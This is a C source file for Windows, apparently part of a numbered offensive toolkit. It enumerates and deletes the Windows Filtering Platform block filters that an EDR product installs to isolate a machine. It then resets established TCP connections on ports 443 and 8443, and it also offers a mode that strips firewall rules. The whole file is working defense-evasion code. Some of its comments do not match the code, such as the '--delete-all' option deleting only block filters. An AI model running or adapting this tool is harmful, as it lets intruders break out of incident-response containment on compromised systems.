/*
 * 02_wfp_delete.c
 * WFP Filter Deletion — enumerate and delete EDR-installed block/contain filters
 *
 * Use case: EDR has put machine in "network containment". Remove the block filters
 *           to restore network connectivity.
 *
 * Build:
 *   cl 02_wfp_delete.c /link fwpuclnt.lib rpcrt4.lib
 *
 * Usage:
 *   02_wfp_delete.exe --list        (list all WFP filters)
 *   02_wfp_delete.exe --delete      (delete all BLOCK filters at ALE_AUTH_CONNECT)
 *   02_wfp_delete.exe --delete-all  (delete ALL filters including non-block)
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <fwpmu.h>
#include <stdio.h>
#include <wchar.h>

#pragma comment(lib, "fwpuclnt.lib")
#pragma comment(lib, "rpcrt4.lib")

static const WCHAR *ActionName(UINT32 type)
{
    switch (type) {
        case FWP_ACTION_BLOCK:               return L"BLOCK";
        case FWP_ACTION_PERMIT:              return L"PERMIT";
        case FWP_ACTION_CALLOUT_TERMINATING: return L"CALLOUT_TERM";
        case FWP_ACTION_CALLOUT_INSPECTION:  return L"CALLOUT_INSP";
        case FWP_ACTION_CALLOUT_UNKNOWN:     return L"CALLOUT_UNK";
        default:                             return L"UNKNOWN";
    }
}

static BOOL IsContainmentLayer(const GUID *layerKey)
{
    return (IsEqualGUID(layerKey, &FWPM_LAYER_ALE_AUTH_CONNECT_V4) ||
            IsEqualGUID(layerKey, &FWPM_LAYER_ALE_AUTH_CONNECT_V6) ||
            IsEqualGUID(layerKey, &FWPM_LAYER_ALE_AUTH_RECV_ACCEPT_V4) ||
            IsEqualGUID(layerKey, &FWPM_LAYER_ALE_AUTH_RECV_ACCEPT_V6) ||
            IsEqualGUID(layerKey, &FWPM_LAYER_OUTBOUND_TRANSPORT_V4) ||
            IsEqualGUID(layerKey, &FWPM_LAYER_OUTBOUND_TRANSPORT_V6));
}

static HANDLE OpenBfe(void)
{
    HANDLE engine = NULL;
    DWORD err = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &engine);
    if (err != ERROR_SUCCESS) {
        wprintf(L"[-] FwpmEngineOpen0 failed: 0x%08X\n", err);
        return NULL;
    }
    return engine;
}

static void EnumAndProcess(HANDLE engine, BOOL doDelete, BOOL allLayers)
{
    HANDLE enumHandle = NULL;
    DWORD err = FwpmFilterCreateEnumHandle0(engine, NULL, &enumHandle);
    if (err != ERROR_SUCCESS) {
        wprintf(L"[-] FwpmFilterCreateEnumHandle0 failed: 0x%08X\n", err);
        return;
    }

    UINT32 totalListed = 0, totalDeleted = 0;
    FWPM_FILTER0 **filters = NULL;
    UINT32 count = 0;

    while ((err = FwpmFilterEnum0(engine, enumHandle, 200, &filters, &count)) == ERROR_SUCCESS
           && count > 0)
    {
        for (UINT32 i = 0; i < count; i++) {
            FWPM_FILTER0 *f = filters[i];
            BOOL isBlock = (f->action.type == FWP_ACTION_BLOCK);
            BOOL inTargetLayer = allLayers ? TRUE : IsContainmentLayer(&f->layerKey);

            if (!inTargetLayer) continue;
            if (!doDelete && !isBlock) continue; /* list mode: only show blocks */

            totalListed++;
            wprintf(L"[%04u] ID=%-12llu  Action=%-14s  Name=%s\n",
                    totalListed, f->filterId,
                    ActionName(f->action.type),
                    f->displayData.name ? f->displayData.name : L"(unnamed)");

            if (doDelete && isBlock) {
                err = FwpmFilterDeleteById0(engine, f->filterId);
                if (err == ERROR_SUCCESS) {
                    totalDeleted++;
                    wprintf(L"       -> DELETED\n");
                } else {
                    wprintf(L"       -> Delete failed: 0x%08X\n", err);
                }
            }
        }
        FwpmFreeMemory0((void **)&filters);
    }

    FwpmFilterDestroyEnumHandle0(engine, enumHandle);

    if (doDelete)
        wprintf(L"\n[+] Deleted %u BLOCK filter(s) of %u total enumerated\n",
                totalDeleted, totalListed);
    else
        wprintf(L"\n[+] Listed %u filter(s)\n", totalListed);
}

/*
 * Kill existing TCP connections using SetTcpEntry — call after deleting filters
 * to force EDR to reconnect (new connections will not have a block filter)
 * Note: this function is usually combined with EDR permit-filter deletion
 */
static void KillExistingEdrConnections(void)
{
    /* Dynamically load iphlpapi to avoid linker dependency in this file */
    typedef DWORD (WINAPI *GetTcpTable2_t)(PMIB_TCPTABLE2, PULONG, BOOL);
    typedef DWORD (WINAPI *SetTcpEntry_t)(PMIB_TCPROW);

    HMODULE hIphlp = LoadLibraryW(L"iphlpapi.dll");
    if (!hIphlp) return;

    GetTcpTable2_t pGetTcpTable2 = (GetTcpTable2_t)GetProcAddress(hIphlp, "GetTcpTable2");
    SetTcpEntry_t  pSetTcpEntry  = (SetTcpEntry_t) GetProcAddress(hIphlp, "SetTcpEntry");

    if (!pGetTcpTable2 || !pSetTcpEntry) { FreeLibrary(hIphlp); return; }

    /* Get TCP table */
    ULONG bufSize = sizeof(MIB_TCPTABLE2);
    MIB_TCPTABLE2 *table = (MIB_TCPTABLE2 *)HeapAlloc(GetProcessHeap(), 0, bufSize);
    while (pGetTcpTable2(table, &bufSize, TRUE) == ERROR_INSUFFICIENT_BUFFER) {
        HeapFree(GetProcessHeap(), 0, table);
        table = (MIB_TCPTABLE2 *)HeapAlloc(GetProcessHeap(), 0, bufSize);
    }

    wprintf(L"[*] Resetting active TCP connections...\n");
    UINT32 reset = 0;

    for (DWORD i = 0; i < table->dwNumEntries; i++) {
        MIB_TCPROW2 *row = &table->table[i];
        if (row->dwState != MIB_TCP_STATE_ESTAB) continue;

        /* Check if connection belongs to an EDR process (PID check) */
        /* For simplicity here we reset ALL ESTABLISHED connections on port 443 */
        WORD remotePort = ntohs((WORD)row->dwRemotePort);
        if (remotePort != 443 && remotePort != 8443) continue;

        MIB_TCPROW deleteRow;
        deleteRow.dwState      = MIB_TCP_STATE_DELETE_TCB;
        deleteRow.dwLocalAddr  = row->dwLocalAddr;
        deleteRow.dwLocalPort  = row->dwLocalPort;
        deleteRow.dwRemoteAddr = row->dwRemoteAddr;
        deleteRow.dwRemotePort = row->dwRemotePort;

        if (pSetTcpEntry(&deleteRow) == NO_ERROR) {
            reset++;
        }
    }

    HeapFree(GetProcessHeap(), 0, table);
    FreeLibrary(hIphlp);
    wprintf(L"[+] Reset %u TCP connection(s)\n", reset);
}

int wmain(int argc, wchar_t *argv[])
{
    wprintf(L"[*] WFP Filter Delete Tool\n");

    HANDLE engine = OpenBfe();
    if (!engine) return 1;

    if (argc >= 2 && _wcsicmp(argv[1], L"--list") == 0) {
        wprintf(L"[*] Listing BLOCK filters at connection layers:\n\n");
        EnumAndProcess(engine, FALSE, FALSE);
    } else if (argc >= 2 && _wcsicmp(argv[1], L"--delete") == 0) {
        wprintf(L"[*] Deleting BLOCK filters at connection layers:\n\n");
        EnumAndProcess(engine, TRUE, FALSE);
        KillExistingEdrConnections();
    } else if (argc >= 2 && _wcsicmp(argv[1], L"--delete-all") == 0) {
        wprintf(L"[!] Deleting ALL filters (WARNING: disables Windows Firewall rules too)\n\n");
        EnumAndProcess(engine, TRUE, TRUE);
    } else {
        wprintf(L"Usage:\n");
        wprintf(L"  %s --list        List BLOCK filters\n", argv[0]);
        wprintf(L"  %s --delete      Delete BLOCK filters (restores network)\n", argv[0]);
        wprintf(L"  %s --delete-all  Delete ALL filters\n", argv[0]);
    }

    FwpmEngineClose0(engine);
    return 0;
}
